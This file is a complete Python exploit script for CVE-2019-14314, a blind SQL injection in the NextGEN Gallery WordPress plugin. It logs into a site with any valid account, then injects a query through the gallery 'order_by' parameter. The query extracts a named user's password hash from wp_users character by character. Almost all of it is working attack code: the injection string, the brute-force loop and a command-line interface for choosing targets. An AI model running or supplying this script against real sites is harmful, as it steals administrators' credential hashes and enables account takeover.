#!/usr/bin/env python3
# Author: @imthoe
# CVE-2019-14314
# https://www.fortinet.com/blog/threat-research/wordpress-plugin-sql-injection-vulnerability.html
# This script will extract the password hash of a given username
# Usage: ./cve_2019_14314.py <url> <login_user> <login_pass> <username>
# Example: ./cve_2019_14314.py http://localhost/wp tom password123 admin

import sys
import requests
import argparse

false_ret = '{"limit":"5000","offset":0,"total":0,"items":[]}'

post_data = {
        "action":"get_displayed_gallery_entities",
        "limit":"5000",
        "offset":"0",
        "nonce":"00000000",
        "displayed_gallery[source]":"galleries",
        "displayed_gallery[display_type]":"photocrati-nextgen_basic_thumbnails",
        "displayed_gallery[display_settings][use_lightbox_effect]":"true",
        "displayed_gallery[display_settings][display_view]":"default-view.php",
        "displayed_gallery[display_settings][images_per_page]":"24",
        "displayed_gallery[display_settings][number_of_columns]":"0",
        "displayed_gallery[display_settings][thumbnail_width]":"240",
        "displayed_gallery[display_settings][thumbnail_height]":"160",
        "displayed_gallery[display_settings][show_all_in_lightbox]":"0",
        "displayed_gallery[display_settings][ajax_pagination]":"1",
        "displayed_gallery[display_settings][use_imagebrowser_effect]":"0",
        "displayed_gallery[display_settings][template]":"",
        "displayed_gallery[display_settings][display_no_images_error]":"1",
        "displayed_gallery[display_settings][disable_pagination]":"0",
        "displayed_gallery[display_settings][show_slideshow_link]":"0",
        "displayed_gallery[display_settings][slideshow_link_text]":"View Slideshow",
        "displayed_gallery[display_settings][override_thumbnail_settings]":"0",
        "displayed_gallery[display_settings][thumbnail_quality]":"100",
        "displayed_gallery[display_settings][thumbnail_crop]":"1",
        "displayed_gallery[display_settings][thumbnail_watermark]":"0",
        "displayed_gallery[display_settings][ngg_triggers_display]":"never",
        "displayed_gallery[slug]":"",
        "displayed_gallery[id]":"",
        "displayed_gallery[ids]":"",
        "displayed_gallery[order_by]":"", # SQLi here
        "displayed_gallery[order_direction]":"ASC",
        "displayed_gallery[tagcloud]":"false",
        "displayed_gallery[returns]":"included",
        "displayed_gallery[maximum_entity_count]":"500",
        "displayed_gallery[__defaults_set]":"true"
        }


def login(url,username,password):
    wp_login = url+'/wp-login.php'
    wp_admin = url+'/wp-admin/'

    with requests.Session() as s:
        cookies = { 'wordpress_test_cookie':'WP Cookie check' }
        data={ 
            'log':username, 'pwd':password, 'wp-submit':'Log In', 
            'redirect_to':wp_admin, 'testcookie':'1'
        }    
        s.post(wp_login, cookies=cookies, data=data, allow_redirects=False)
        resp = s.get(wp_admin, allow_redirects=False)
        return s.cookies

def exploit(wp_url,username,cookies):
    url = wp_url+'/index.php?photocrati_ajax=1'
    charset = '$0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&()*+,-./:;<=>?@[]^_`{|}~'
    password = ''
    for x in range(0,40):
        for c in charset:
            query_username = 'concat('+''.join(['char('+str(ord(p))+'),' for p in username])[:-1]+')'
            query_pass = 'concat('+''.join(['char('+str(ord(p))+'),' for p in password])+'char('+str(ord(c))+'),char(37))'
            query = '1,(select case when (select ID from wp_users where user_login={} and user_pass like binary {}) then 1 else 1*(select 1 union select 2)end)=1-- -'.format(query_username,query_pass)
            post_data['displayed_gallery[order_by]'] = query
            r = requests.post(url,cookies=cookies,data=post_data)
            if r.text != false_ret:
                password+=c
                print('Password: '+password)
                break
    return password

def run(args):
    try:
        cookies = login(args.url,args.login_user,args.login_pass)
    except:
        print('Login Failed')
        sys.exit()
    if len(cookies) < 3:
        print('Login Failed')
        sys.exit()
    else:
        exploit(args.url,args.username,cookies)

def main():
    parser = argparse.ArgumentParser(description='CVE-2019-14314 Hash Extractor')
    parser.add_argument('url',help='Wordpress blog URL')
    parser.add_argument('login_user',help='Username to login with')
    parser.add_argument('login_pass',help='Password to login with')
    parser.add_argument('username',help='Username to extract Password Hash from')
    args = parser.parse_args()
    run(args)

main()
